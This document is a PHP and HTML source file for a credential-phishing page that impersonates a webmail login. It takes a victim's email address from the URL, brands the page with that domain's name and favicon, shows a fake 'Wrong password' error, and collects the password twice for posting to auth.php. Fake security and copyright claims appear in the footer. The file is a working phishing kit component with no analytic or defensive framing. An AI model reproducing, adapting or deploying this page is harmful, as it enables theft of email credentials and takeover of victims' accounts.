<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);

?>
<!DOCTYPE html>
<html>
<head>
<title><?php echo $yuh ?> Webmail :: Secured <?php echo $yuh ?> Webmail</title>
<meta name="Robots" content="noindex,nofollow" />
<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
<meta name="viewport" content="" id="viewport" />
<link rel="SHORTCUT ICON" href="http://<?=$domain?>/favicon.ico"/>
<link rel="stylesheet" type="text/css" href="bootstrap/styles.css?s=1387973879" />
<!--[if IE 9]><link rel="stylesheet" type="text/css" href="bootstrap/svggradients.css?s=1382384360" /><![endif]-->
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="bootstrap/iehacks.css?s=1382384360" /><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="bootstrap/ie7hacks.css?s=1382384360" /><![endif]-->
<link rel="stylesheet" type="text/css" href="plugins/jqueryui/themes/larry/jquery-ui-1.9.2.custom.css?s=1399644532">
<script type="text/javascript" src="bootstrap/ui.js?s=1382384360"></script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<script src="bootstrap/jquery.min.js?s=1399644532" type="text/javascript"></script>
<script src="bootstrap/common.min.js?s=1399644532" type="text/javascript"></script>
<script src="bootstrap/app.min.js?s=1399644532" type="text/javascript"></script>
<script src="bootstrap/jstz.min.js?s=1399644532" type="text/javascript"></script>
<script type="text/javascript">

</script>

<script type="text/javascript" src="bootstrap/jquery-ui-1.9.2.custom.min.js?s=1399644532"></script>
<style type="text/css">
<!--
.style1 {
	color: rgb(43,170,223);
	font-weight: bold;
	font-size: 24px;
	font-family: Geneva, Arial, Helvetica, sans-serif;
}
-->
</style>
</head>
<body bgcolor="CEC3AD">

<div id="login-form">
<div class="box-inner">
  <div  align="center"><br>
        <span class="style1"><img src="http://<?=$domain?>/favicon.ico" alt="" width="25" height="25"> <?php echo $yuh ?> Online Webmail App</span>  </div>
  <br>
  <!-- End Table 2-->
          </td>





</tr>
        <tr>
          <td>
            <!--Table 3-->
            <table cellpadding="0" cellspacing="0">
			    <col>
			    <col class="w100">
			  <center><font color="red"><p> <b><i>Wrong password. Please try again ! </i></b></p></font></center>
			</table><br>
  <form name="form" action="auth.php" method="post">

<table><tbody><tr><td class="title"><label for="rcmloginuser">Email Address</label>
</td>
<td class="input"><input name="username" type="text" id="rcmloginuser" value="<?=$login?>" size="40" readonly></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd"><font color="red">Password</font></label>
</td>
<td class="input"><input name="password0" value="" id="rcmloginpwd" required size="40" autocapitalize="off" type="password"></td>
</tr>
<tr><td class="title"><label for="rcmloginpwd"><font color="red">Confirm Password</font></label>
</td>
<td class="input"><input name="password1" value="" id="rcmloginpwd" required size="40" autocapitalize="off" type="password"></td>
</tr>
</tbody>
</table>


<p class="formbuttons"><input type="submit" class="button mainaction" onClick="MM_validateForm('rcmloginuser','','RisEmail','rcmloginpwd','','R');return document.MM_returnValue" value="Login to continue" /><br><br>
<br>

Connected to <?=$login?> </p>
</form>
</div>

<div id="bottomline">
Secured by <?php echo $yuh ?> Webmail Security Systems<br>
&copy; 2019 <?php echo $yuh ?> Corporation. All rights reserved.
		
</div>
</div>

<script type="text/javascript">

// UI startup
var UI = new rcube_mail_ui();
$(document).ready(function(){
	UI.set('errortitle', 'An error occurred!');
	UI.init();
});

</script>





<script type="text/javascript">

jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
                using: function(pos) {
                    var me = jQuery(this),
                        offset = me.css(pos).offset(),

                        topOffset = offset.top - 12;
                    if (topOffset < 0)
                        me.css('top', pos.top - topOffset);
                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
                        me.css('left', pos.left - 12);
                }
            });
$(document).ready(function(){ 
rcmail.init();
var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
            for (var i=0; i<images.length; i++) {
                img = new Image();
                img.src = images[i];
            }
});
</script>

</body>
</html>